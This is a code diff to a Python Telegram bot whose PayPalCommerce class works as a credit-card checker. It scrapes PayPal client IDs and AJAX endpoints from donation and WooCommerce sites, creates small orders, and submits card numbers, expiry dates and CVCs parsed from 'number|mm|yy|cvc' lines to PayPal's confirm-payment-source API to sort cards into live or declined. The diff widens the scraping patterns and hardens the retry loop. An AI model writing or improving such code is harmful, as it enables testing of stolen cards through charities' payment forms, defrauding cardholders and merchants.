@@ -64,6 +64,8 @@ def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=3):
                     wait_time = 30
                 print(f"⏳ FloodWait (edit): {wait_time}s")
                 time.sleep(min(wait_time, 60))
+            elif "message is not modified" in str(e).lower():
+                return None
             else:
                 break
     return None
@@ -436,15 +438,21 @@ class PayPalCommerce:
 
     def _extract_client_id(self, html):
         patterns = [
-            r'client-id="([^"]+)"', r'client_id["\']?\s*[:=]\s*["\']([^"\']+)',
-            r'data-client-id="([^"]+)"', r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})',
-            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)', r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)'
+            r'client-id="([^"]+)"', 
+            r'client_id["\']?\s*[:=]\s*["\']([^"\']+)',
+            r'data-client-id="([^"]+)"', 
+            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})',
+            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)', 
+            r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)',
+            r'data-paypal-client-id="([^"]+)"',
+            r'data-client-token="([^"]+)"',
         ]
         for pattern in patterns:
             match = re.search(pattern, html, re.IGNORECASE)
             if match:
                 self.client_id = match.group(1)
                 return
+        
         script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
         for script in script_matches:
             for pattern in patterns:
@@ -452,16 +460,25 @@ class PayPalCommerce:
                 if match:
                     self.client_id = match.group(1)
                     return
-        long_strings = re.findall(r'["\']([A-Za-z0-9_-]{80,})["\']', html)
-        for string in long_strings:
-            if string.startswith(('A', 'B', 'E')):
-                self.client_id = string
+        
+        # البحث عن client_id في JavaScript objects
+        js_patterns = [
+            r'clientId\s*:\s*["\']([A-Za-z0-9_-]{20,})["\']',
+            r'client_id\s*:\s*["\']([A-Za-z0-9_-]{20,})["\']',
+            r'client-id\s*:\s*["\']([A-Za-z0-9_-]{20,})["\']',
+        ]
+        for pattern in js_patterns:
+            match = re.search(pattern, html, re.IGNORECASE)
+            if match:
+                self.client_id = match.group(1)
                 return
 
     def _extract_form_data(self, html):
         inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
         for name, value in inputs:
             self.form_data[name] = value
+        
+        # استخراج data attributes
         data_attrs = re.findall(r'data-([\w-]+)="([^"]+)"', html)
         for attr_name, attr_value in data_attrs:
             if any(k in attr_name.lower() for k in ['give', 'paypal', 'form', 'client', 'merchant', 'nonce', 'hash']):
@@ -472,13 +489,30 @@ class PayPalCommerce:
             self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
         elif 'wc-ajax' in html:
             self.ajax_url = f'https://{self.url}/?wc-ajax=checkout'
+        elif 'ajaxurl' in html:
+            match = re.search(r'ajaxurl["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
+            if match:
+                self.ajax_url = match.group(1)
+                if not self.ajax_url.startswith('http'):
+                    self.ajax_url = f'https://{self.url}{self.ajax_url}'
 
     def _get_access_token(self):
         if not self.client_id:
             return None
         try:
-            headers = {'user-agent': self.get_next_ua(), 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded'}
-            response = self.r.post('https://api-m.paypal.com/v1/oauth2/token', headers=headers, data={'grant_type': 'client_credentials'}, auth=(self.client_id, ''), timeout=15)
+            headers = {
+                'user-agent': self.get_next_ua(), 
+                'accept': 'application/json', 
+                'content-type': 'application/x-www-form-urlencoded',
+                'accept-language': 'en_US'
+            }
+            response = self.r.post(
+                'https://api-m.paypal.com/v1/oauth2/token', 
+                headers=headers, 
+                data={'grant_type': 'client_credentials'}, 
+                auth=(self.client_id, ''), 
+                timeout=15
+            )
             if response.status_code == 200:
                 self.access_token = response.json().get('access_token')
                 return self.access_token
@@ -493,7 +527,14 @@ class PayPalCommerce:
             actions = ['give_paypal_commerce_get_client_token', 'get_client_token', 'paypal_get_client_token']
             for action in actions:
                 data = {'action': action, 'form-id': self.form_data.get('give-form-id', '')}
-                headers = {'user-agent': self.get_next_ua(), 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
+                headers = {
+                    'user-agent': self.get_next_ua(), 
+                    'x-requested-with': 'XMLHttpRequest', 
+                    'origin': f'https://{self.url}', 
+                    'referer': f'https://{self.url}{self.inurl}', 
+                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'accept': 'application/json, text/javascript, */*; q=0.01'
+                }
                 response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=10)
                 if response.status_code == 200 and response.text:
                     try:
@@ -535,7 +576,14 @@ class PayPalCommerce:
         if self.minimum_amount != "1.00":
             amounts.append(self.minimum_amount)
         amounts.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00", "250.00", "500.00"])
-        headers = {'user-agent': self.get_next_ua(), 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
+        headers = {
+            'user-agent': self.get_next_ua(), 
+            'accept': 'application/json, text/javascript, */*; q=0.01', 
+            'x-requested-with': 'XMLHttpRequest', 
+            'origin': f'https://{self.url}', 
+            'referer': f'https://{self.url}{self.inurl}', 
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
+        }
         actions = ['give_paypal_commerce_create_order', 'give_create_order', 'create_order']
         for amount in amounts:
             form_data = self.get_base_form_data()
@@ -569,8 +617,18 @@ class PayPalCommerce:
         if not self.access_token:
             return None
         try:
-            headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua(), 'accept': 'application/json'}
-            data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.donation}}], 'application_context': {'shipping_preference': 'NO_SHIPPING', 'user_action': 'PAY_NOW'}}
+            headers = {
+                'authorization': f'Bearer {self.access_token}', 
+                'content-type': 'application/json', 
+                'user-agent': self.get_next_ua(), 
+                'accept': 'application/json',
+                'paypal-request-id': str(random.randint(1000000000, 9999999999))
+            }
+            data = {
+                'intent': 'CAPTURE', 
+                'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.donation}}], 
+                'application_context': {'shipping_preference': 'NO_SHIPPING', 'user_action': 'PAY_NOW'}
+            }
             response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
             if response.status_code in [200, 201]:
                 response_data = response.json()
@@ -584,8 +642,16 @@ class PayPalCommerce:
         if not self.client_token:
             return None
         try:
-            headers = {'authorization': f'Bearer {self.client_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua(), 'accept': 'application/json'}
-            data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.donation}}]}
+            headers = {
+                'authorization': f'Bearer {self.client_token}', 
+                'content-type': 'application/json', 
+                'user-agent': self.get_next_ua(), 
+                'accept': 'application/json'
+            }
+            data = {
+                'intent': 'CAPTURE', 
+                'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.donation}}]
+            }
             response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
             if response.status_code in [200, 201]:
                 response_data = response.json()
@@ -602,7 +668,11 @@ class PayPalCommerce:
                 return result
         if self.access_token:
             try:
-                headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua()}
+                headers = {
+                    'authorization': f'Bearer {self.access_token}', 
+                    'content-type': 'application/json', 
+                    'user-agent': self.get_next_ua()
+                }
                 response = self.r.post(f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture', headers=headers, timeout=15)
                 return response
             except:
@@ -616,7 +686,14 @@ class PayPalCommerce:
         if self.minimum_amount != "1.00":
             amounts.append(self.minimum_amount)
         amounts.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00", "250.00", "500.00"])
-        headers = {'user-agent': self.get_next_ua(), 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
+        headers = {
+            'user-agent': self.get_next_ua(), 
+            'accept': 'application/json, text/javascript, */*; q=0.01', 
+            'x-requested-with': 'XMLHttpRequest', 
+            'origin': f'https://{self.url}', 
+            'referer': f'https://{self.url}{self.inurl}', 
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
+        }
         actions = ['give_paypal_commerce_approve_order', 'give_approve_order', 'approve_order']
         for amount in amounts:
             form_data = self.get_base_form_data()
@@ -635,6 +712,7 @@ class PayPalCommerce:
     def _clean_response(self, text):
         if not text:
             return "DECLINED"
+        
         text_strip = text.strip()
         text_lower = text_strip.lower()
 
@@ -682,16 +760,20 @@ class PayPalCommerce:
         try:
             if not self.is_valid_gateway:
                 return "INVALID_GATEWAY"
+            
             parts = ccx.strip().split("|")
             if len(parts) < 4:
                 return "Invalid card format"
+            
             n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
             if "20" in yy:
                 yy = yy.split("20")[1]
             expiry = f"20{yy}-{mm}"
+            
             order_id = self._create_order()
             if not order_id:
                 return "Create Order Failed"
+            
             auth_tokens = []
             if self.client_token:
                 auth_tokens.append(self.client_token)
@@ -699,14 +781,37 @@ class PayPalCommerce:
                 auth_tokens.append(self.access_token)
             if self.client_id:
                 auth_tokens.append(self.client_id)
+            
             confirm_res = None
             confirm_json = {}
             confirm_text = ""
+            
             for auth_token in auth_tokens:
-                he4 = {'authorization': f'Bearer {auth_token}', 'paypal-client-metadata-id': self.client_id or '', 'user-agent': self.get_next_ua()}
-                da3 = {'payment_source': {'card': {'number': n, 'expiry': expiry, 'security_code': cvc, 'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}}, 'application_context': {'vault': False}}
+                he4 = {
+                    'authorization': f'Bearer {auth_token}', 
+                    'paypal-client-metadata-id': self.client_id or '', 
+                    'user-agent': self.get_next_ua(),
+                    'accept': 'application/json',
+                    'content-type': 'application/json'
+                }
+                da3 = {
+                    'payment_source': {
+                        'card': {
+                            'number': n, 
+                            'expiry': expiry, 
+                            'security_code': cvc, 
+                            'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}
+                        }
+                    }, 
+                    'application_context': {'vault': False}
+                }
                 try:
-                    confirm_res = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=he4, json=da3, timeout=15)
+                    confirm_res = self.r.post(
+                        f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', 
+                        headers=he4, 
+                        json=da3, 
+                        timeout=15
+                    )
                     confirm_text = confirm_res.text
                     if confirm_res.status_code == 200:
                         try:
@@ -761,6 +866,7 @@ class PayPalCommerce:
                                 return name
                 except:
                     pass
+                
                 issue_matches = re.findall(r'"issue"\s*:\s*"([^"]+)"', confirm_text)
                 if issue_matches:
                     issue = issue_matches[0]
@@ -770,6 +876,7 @@ class PayPalCommerce:
                     if desc_matches:
                         return f"{issue}: {desc_matches[0]}"
                     return issue
+                
                 name_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', confirm_text)
                 if name_matches:
                     name = name_matches[0]
@@ -1308,9 +1415,8 @@ print('✅ Bot is running...')
 # حلقة تشغيل محصنة ضد الأخطاء
 while True:
     try:
-        # استخدم polling عادي بدل infinity_polling
         bot.polling(
-            none_stop=False,  # يسمح بإعادة التشغيل عند الخطأ
+            none_stop=False,
             interval=0,
             timeout=30,
             long_polling_timeout=30
@@ -1324,24 +1430,18 @@ while True:
         if "502" in error_msg:
             print('⚠️ 502 Bad Gateway - Telegram server issue. Retrying in 5s...')
             time.sleep(5)
-            continue
         elif "409" in error_msg:
             print('⚠️ 409 Conflict - Another instance running. Waiting 15s...')
             time.sleep(15)
-            continue
         elif "429" in error_msg:
             print('⚠️ 429 Too Many Requests. Waiting 30s...')
             time.sleep(30)
-            continue
         elif "ReadTimeout" in error_msg or "timeout" in error_msg.lower():
             print('⚠️ Timeout. Retrying in 3s...')
             time.sleep(3)
-            continue
         elif "Connection" in error_msg or "ConnectionError" in error_msg:
             print('⚠️ Connection error. Retrying in 5s...')
             time.sleep(5)
-            continue
         else:
             print(f'❌ Unexpected error: {error_msg[:100]}')
             time.sleep(5)
-            continue
